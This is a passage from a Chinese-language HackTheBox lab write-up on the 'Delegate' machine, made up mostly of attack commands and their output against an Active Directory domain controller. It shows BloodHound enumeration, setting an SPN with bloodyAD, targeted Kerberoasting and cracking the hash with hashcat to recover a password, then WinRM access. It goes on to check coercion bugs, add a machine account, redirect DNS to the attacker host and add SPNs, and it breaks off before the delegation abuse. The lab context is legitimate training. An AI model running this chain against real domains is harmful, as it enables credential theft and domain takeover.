+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc1.delegate.vl
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc1.delegate.vl
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">9</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">53</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: DC1.delegate.vl
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 17S
+</span></span><span style="display:flex;"><span>INFO: Compressing output into 20250921220229_bloodhound.zip
+</span></span></code></pre></div><p>猎犬的权限很简单，我就口述不贴图了，我们控制的这个用户A.BRIGGS@DELEGATE.VL对N.THOMPSON@DELEGATE.VL这个用户有通用写入权限，并且这个用户在远程管理组，应该就是下一步的路径，没有配置kpinit,直接打靶向kerbresating</p>
+<p>首先给其注册服务</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodyAD -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> --host <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> set object <span style="color:#e6db74">&#34;N.THOMPSON&#34;</span> servicePrincipalName -v <span style="color:#e6db74">&#39;http/anything&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> N.THOMPSON<span style="color:#960050;background-color:#1e0010">&#39;</span>s servicePrincipalName has been updated
+</span></span></code></pre></div><p>同步时间后打kerbresating</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-GetUserSPNs $domain/$user:$pass -dc-host $FQDN -dc-ip $ip -request
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServicePrincipalName  Name        MemberOf                                         PasswordLastSet             LastLogon                   Delegation 
+</span></span><span style="display:flex;"><span>--------------------  ----------  -----------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span style="display:flex;"><span>http/anything         N.Thompson  CN<span style="color:#f92672">=</span>delegation admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>delegate,DC<span style="color:#f92672">=</span>vl  2023-09-09 11:17:16.247262  2023-09-16 03:18:20.238500             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$ab77a79521321ac54700c727df347190$b5c30f649f35513d225a34e68354f7f0390e23322c84bb8f6c8c1f3b919ab5de89be685ca3ef73dd53b6c317a4e40bb............5feb2b954815b4ed179c178af25c12310fa2edfdb80f260975610aeada10c73489850734331cff27a185b7bec45fafaa0fc492d0620fc062532f39d02086ef87174eb0feb727ea633b64cd0e3c31c7f9e6256d99df5de1c1b393b88d5350b95182ea6167c263db810bc3e7e914a1c34d51ebdc11f37d20f7c36e871f6b232c120d1d2b887702c6f279b24a5a523107cd8e12cfd1828746e069f7a64d7148fad0f542e4fcbf17cb7dd5b3b6f12cfd8e4aebab39ef494acfe77a484b25f9dc40c23adbf93f4c7f4968a57cc
+</span></span></code></pre></div><p>爆破v2hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#39;$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$ab77a79521321ac54700c727df347190$b5c30f649f35513d225a34e68354f7f0390e23322c84bb8f6c8c1f3b919ab5de89be685ca3ef73dd53b6c317a4e40bb........4a5a523107cd8e12cfd1828746e069f7a64d7148fad0f542e4fcbf17cb7dd5b3b6f12cfd8e4aebab39ef494acfe77a484b25f9dc40c23adbf93f4c7f4968a57cca76e4fffdc54dd0a80cbd8daf1888b0096a91957307cac2afd0e73c1c2a07ad4feb611ac0900fc79351df45800ebf802674fd2b76449da3f83eece2&#39;</span>&gt;hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat hash /usr/share/wordlists/rockyou.txt 
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting in autodetect mode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================================================================================================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#1: cpu-sandybridge-Intel(R) Core(TM) Ultra 9 185H, 6939/13942 MB (2048 MB allocatable), 8MCU</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+</span></span><span style="display:flex;"><span>The following mode was auto-detected as the only one matching your input hash:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">13100</span> | Kerberos 5, etype 23, TGS-REP | Network Protocol
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+</span></span><span style="display:flex;"><span>Do NOT report auto-detect issues unless you are certain of the hash type.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
+</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Optimizers applied:
+</span></span><span style="display:flex;"><span>* Zero-Byte
+</span></span><span style="display:flex;"><span>* Not-Iterated
+</span></span><span style="display:flex;"><span>* Single-Hash
+</span></span><span style="display:flex;"><span>* Single-Salt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
+</span></span><span style="display:flex;"><span>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style="display:flex;"><span>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">2</span> MB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dictionary cache hit:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921507</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cracking performance lower than expected?                 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Append -O to the commandline.
+</span></span><span style="display:flex;"><span>  This lowers the maximum supported password/salt length <span style="color:#f92672">(</span>usually down to 32<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Append -w <span style="color:#ae81ff">3</span> to the commandline.
+</span></span><span style="display:flex;"><span>  This can cause your screen to lag.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Append -S to the commandline.
+</span></span><span style="display:flex;"><span>  This has a drastic speed impact but can be better <span style="color:#66d9ef">for</span> specific attacks.
+</span></span><span style="display:flex;"><span>  Typical scenarios are a small wordlist but a large ruleset.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Update your backend API runtime / driver the right way:
+</span></span><span style="display:flex;"><span>  https://hashcat.net/faq/wrongdriver
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>* Create more work items to make use of your parallelization power:
+</span></span><span style="display:flex;"><span>  https://hashcat.net/faq/morework
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$ab77a79521321ac54700c727df347190$b5c30f649f35513d225a34e68354f7f0390e23322c84bb8f6c8c1f3b919ab5de89be685ca3ef73dd53b6c317a4e40bb3712f1785ab2fe3e070bbf6788c035f053e6e6d51758879eb0e7199e49740aac4bba8719d312af7dffcd471a152daa3736161f15b22375e3cc0a5a48d589066b9df4a0c16e811da2fe0b4c12df8ed42fbddf1efea66e056946b2c11ac3b4e3128df00f207ab18741d1a9e5362fb4703be2c0e9bd9bae37e8be8f2ed8596c78d81c3f8388341641cf9003。。。。620fc062532f39d02086ef87174eb0feb727ea633b64cd0e3c31c7f9e6256d99df5de1c1b393b88d5350b95182ea6167c263db810bc3e7e914a1c34d51ebdc11f37d20f7c36e871f6b232c120d1d2b887702c6f279b24a5a523107cd8e12cfd1828746e069f7a64d7148fad0f542e4fcbf17cb7dd5b3b6f12cfd8e4aebab39ef494acfe77a484b25f9dc40c23adbf93f4c7f4968a57cca76e4fffdc54dd0a80cbd8daf1888b0096a91957307cac2afd0e73c1c2a07ad4feb611ac0900fc79351df45800ebf802674fd2b76449da3f83eece2:KALEB_2341
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">13100</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, TGS-REP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: $krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.T...3eece2
+</span></span><span style="display:flex;"><span>Time.Started.....: Sun Sep <span style="color:#ae81ff">21</span> 22:14:19 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Sun Sep <span style="color:#ae81ff">21</span> 22:14:24 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#1.........:  2302.4 kH/s <span style="color:#f92672">(</span>1.95ms<span style="color:#f92672">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Progress.........: 11010048/14344385 <span style="color:#f92672">(</span>76.76%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/11010048 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 11001856/14344385 <span style="color:#f92672">(</span>76.70%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#1....: KANGOL1 -&gt; Joytjiong1
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 50%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Sun Sep <span style="color:#ae81ff">21</span> 22:14:15 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>Stopped: Sun Sep <span style="color:#ae81ff">21</span> 22:14:26 <span style="color:#ae81ff">2025</span>
+</span></span></code></pre></div><p>获取用户凭证，存在winrm权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass2<span style="color:#f92672">=</span>KALEB_2341&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user2<span style="color:#f92672">=</span>N.Thompson&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm $ip -u $user2 -p $pass2
+</span></span><span style="display:flex;"><span>WINRM       10.129.234.69   <span style="color:#ae81ff">5985</span>   DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:delegate.vl<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.234.69   <span style="color:#ae81ff">5985</span>   DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> delegate.vl<span style="color:#ae81ff">\N</span>.Thompson:KALEB_2341 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>登陆后获得user.txt，就不放出来了</p>
+<h2 id="提权">提权
+</h2><p>此用户存在特殊权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\N</span>.Thompson<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                                                    State  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================================================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
+</span></span><span style="display:flex;"><span>SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted <span style="color:#66d9ef">for</span> delegation Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
+</span></span></code></pre></div><p>SeEnableDelegationPrivilege这个权限我昨天在博客解析过了，血缇之书中记录过打法</p>
+<p>先测试能否进行无约束委派的创建（检测机器用户创建权限）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap $ip -u $user2 -p $pass2 -M maq
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.69   <span style="color:#ae81ff">389</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:delegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.69   <span style="color:#ae81ff">389</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> delegate.vl<span style="color:#ae81ff">\N</span>.Thompson:KALEB_2341 
+</span></span><span style="display:flex;"><span>MAQ         10.129.234.69   <span style="color:#ae81ff">389</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting the MachineAccountQuota
+</span></span><span style="display:flex;"><span>MAQ         10.129.234.69   <span style="color:#ae81ff">389</span>    DC1              MachineAccountQuota: <span style="color:#ae81ff">10</span>
+</span></span></code></pre></div><p>中继触发流程也正常</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb $ip -u $user2 -p $pass2 -M coerce_plus 
+</span></span><span style="display:flex;"><span>/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style="color:#66d9ef">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style="display:flex;"><span>  from pkg_resources import resource_filename
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:delegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> delegate.vl<span style="color:#ae81ff">\N</span>.Thompson:KALEB_2341 
+</span></span><span style="display:flex;"><span>COERCE_PLUS 10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              VULNERABLE, DFSCoerce
+</span></span><span style="display:flex;"><span>COERCE_PLUS 10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              VULNERABLE, PetitPotam
+</span></span><span style="display:flex;"><span>COERCE_PLUS 10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              VULNERABLE, PrinterBug
+</span></span><span style="display:flex;"><span>COERCE_PLUS 10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              VULNERABLE, PrinterBug
+</span></span><span style="display:flex;"><span>COERCE_PLUS 10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              VULNERABLE, MSEven
+</span></span></code></pre></div><p>创建机器用户，并转录密码为hash方便下一步攻击</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-addcomputer -computer-name FS01 -computer-pass <span style="color:#e6db74">&#39;wackwack1$&#39;</span> -dc-ip $ip $domain/$user2:$pass2
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account FS01$ with password wackwack1$.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#39;wackwack1$&#39;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span><span style="display:flex;"><span>MD4<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)=</span> 58826d80a57b1527e373616eec499b06
+</span></span></code></pre></div><p>修改创建机器用户的dns记录导向我们的kali</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/ad-tools/krbrelayx/krbrelayx-master<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 dnstool.py -u <span style="color:#e6db74">&#39;delegate.vl\FS01$&#39;</span> -p <span style="color:#e6db74">&#39;wackwack1$&#39;</span> --action add --record FS01.delegate.vl --data 10.10.16.23 --type A -dns-ip 10.129.6.221 DC1.delegate.vl
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Connecting to host...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Binding to host
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Adding new record
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LDAP operation completed successfully
+</span></span></code></pre></div><p>配置spn</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/ad-tools/krbrelayx/krbrelayx-master<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 addspn.py -u <span style="color:#e6db74">&#39;delegate.vl\FS01$&#39;</span> -p <span style="color:#e6db74">&#39;wackwack1$&#39;</span> -s <span style="color:#e6db74">&#39;cifs/FS01.delegate.vl&#39;</span> -t FS01$ -dc-ip 10.129.6.221 DC1.delegate.vl --additional
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Connecting to host...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Binding to host
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found modification target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SPN Modified successfully
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tools/ad-tools/krbrelayx/krbrelayx-master<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 addspn.py -u <span style="color:#e6db74">&#39;delegate.vl\FS01$&#39;</span> -p <span style="color:#e6db74">&#39;wackwack1$&#39;</span> -s <span style="color:#e6db74">&#39;cifs/FS01.delegate.vl&#39;</span> -t FS01$ -dc-ip 10.129.6.221 DC1.delegate.vl
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Connecting to host...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Binding to host
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found modification target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SPN Modified successfully
+</span></span></code></pre></div><p>利用bloodyad配置无约束委派</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
